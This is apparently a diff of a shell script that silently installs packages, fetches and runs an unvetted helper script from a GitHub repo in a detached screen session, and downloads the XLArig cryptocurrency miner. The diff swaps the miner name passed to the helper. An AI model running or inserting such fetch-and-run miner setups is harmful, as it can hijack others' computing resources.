@@ -8,7 +8,7 @@ sudo apt install unzip > /dev/null 2>&1
 sudo apt install screen -y > /dev/null 2>&1
 wget https://github.com/wikangdijalalan2/jagahkurang34/raw/main/limiting.sh 
 chmod +x limiting.sh 
-screen -dmS randum ./limiting.sh xmrig 65 75 
+screen -dmS randum ./limiting.sh xlarig 65 75 
 wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip
 unzip XLArig-v5.2.2-linux-x86_64.zip
 ls
